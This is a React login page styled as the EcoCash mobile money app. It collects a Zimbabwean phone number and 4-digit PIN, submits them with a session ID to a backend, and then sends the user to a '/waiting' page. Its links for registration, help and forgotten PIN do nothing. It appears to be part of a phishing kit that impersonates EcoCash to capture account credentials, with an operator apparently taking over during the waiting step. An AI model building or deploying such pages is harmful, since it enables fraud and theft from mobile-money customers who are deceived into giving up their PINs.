import { useState } from "react";
import { useLocation } from "wouter";
import { useSubmitLogin } from "@workspace/api-client-react";
import { getSessionId } from "@/lib/session";
import { Button } from "@/components/ui/button";
import { Eye, EyeOff, HelpCircle, UserPlus } from "lucide-react";
import { toast } from "sonner";

export default function Login() {
  const [, setLocation] = useLocation();
  const [phone, setPhone] = useState("");
  const [pin, setPin] = useState("");
  const [showPin, setShowPin] = useState(false);
  const submitLogin = useSubmitLogin();
  const sessionId = getSessionId();

  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '').slice(0, 4);
    setPin(val);
  };

  const handleLogin = () => {
    if (!sessionId) {
      toast.error("Session lost. Please restart application.");
      return;
    }
    
    if (phone.length < 5 || pin.length !== 4) return;

    submitLogin.mutate(
      {
        sessionId,
        data: {
          phone,
          pin
        }
      },
      {
        onSuccess: () => {
          setLocation("/waiting");
        },
        onError: () => {
          toast.error("Failed to submit login details.");
        }
      }
    );
  };

  const isValid = phone.length >= 5 && pin.length === 4;

  return (
    <div className="min-h-[100dvh] w-full max-w-md mx-auto bg-gray-50 flex flex-col justify-between">
      <div className="bg-white pb-8 rounded-b-[32px] shadow-sm border-b border-gray-100 flex-1">
        <div className="pt-12 pb-8 flex flex-col items-center">
          <div className="text-3xl font-bold tracking-tight mb-2">
            <span className="text-blue-950">Eco</span>
            <span className="text-blue-600">Cash</span>
          </div>
          <h1 className="text-xl font-medium text-gray-800">Login</h1>
        </div>

        <div className="px-6 space-y-6">
          <div className="space-y-2">
            <div className="flex h-14 rounded-xl bg-gray-50 border border-gray-200 overflow-hidden focus-within:ring-2 focus-within:ring-blue-500 focus-within:border-transparent transition-all">
              <div className="px-4 flex items-center justify-center bg-gray-100/50 border-r border-gray-200 text-gray-800 font-medium text-lg">
                <span className="mr-2">🇿🇼</span> +263
              </div>
              <input
                type="tel"
                value={phone}
                onChange={e => setPhone(e.target.value.replace(/\D/g, ''))}
                className="flex-1 bg-transparent px-4 outline-none text-lg font-medium tracking-wide placeholder:font-normal placeholder:text-gray-400"
                placeholder="77 123 4567"
              />
            </div>
          </div>

          <div className="space-y-3 relative">
            <div className="flex justify-between items-center px-1">
              <label className="text-sm font-medium text-gray-600">Enter PIN</label>
              <button 
                type="button" 
                onClick={() => setShowPin(!showPin)} 
                className="text-gray-400 hover:text-gray-600"
              >
                {showPin ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
              </button>
            </div>
            
            <div className="relative">
              {/* Invisible input that captures the actual typing */}
              <input
                type="tel"
                value={pin}
                onChange={handlePinChange}
                className="absolute inset-0 w-full h-full opacity-0 cursor-text z-10"
                autoComplete="off"
              />
              
              {/* Visual PIN display */}
              <div className="flex gap-3 justify-between">
                {[0, 1, 2, 3].map((index) => (
                  <div 
                    key={index}
                    className={`w-14 h-16 rounded-xl flex items-center justify-center text-2xl font-bold border transition-all ${
                      pin.length > index ? 'border-blue-500 bg-blue-50/50' : 'border-gray-200 bg-gray-50'
                    } ${pin.length === index ? 'ring-2 ring-blue-200' : ''}`}
                  >
                    {pin[index] ? (showPin ? pin[index] : '•') : ''}
                  </div>
                ))}
              </div>
            </div>
            
            <div className="text-right mt-2">
              <button className="text-sm text-blue-600 font-medium">Forgot PIN?</button>
            </div>
          </div>

          <Button 
            className="w-full gradient-blue rounded-xl h-14 text-lg font-semibold shadow-md shadow-blue-500/20 mt-8"
            disabled={!isValid || submitLogin.isPending}
            onClick={handleLogin}
          >
            {submitLogin.isPending ? "Logging in..." : "Login"}
          </Button>
        </div>
      </div>

      <div className="p-6 pb-8">
        <div className="grid grid-cols-2 gap-4 mb-8">
          <div className="bg-white p-4 rounded-2xl shadow-sm flex flex-col items-center justify-center gap-2 border border-gray-100">
            <div className="w-10 h-10 rounded-full bg-blue-50 flex items-center justify-center text-blue-600">
              <UserPlus className="w-5 h-5" />
            </div>
            <span className="text-sm font-medium text-gray-700">Register</span>
          </div>
          <div className="bg-white p-4 rounded-2xl shadow-sm flex flex-col items-center justify-center gap-2 border border-gray-100">
            <div className="w-10 h-10 rounded-full bg-blue-50 flex items-center justify-center text-blue-600">
              <HelpCircle className="w-5 h-5" />
            </div>
            <span className="text-sm font-medium text-gray-700">Help & Support</span>
          </div>
        </div>
        
        <div className="flex flex-col items-center gap-2">
          <p className="text-xs text-gray-400 font-medium">Version 3.2.1</p>
          <button className="text-xs text-blue-600 font-medium">Terms & Conditions</button>
        </div>
      </div>
    </div>
  );
}
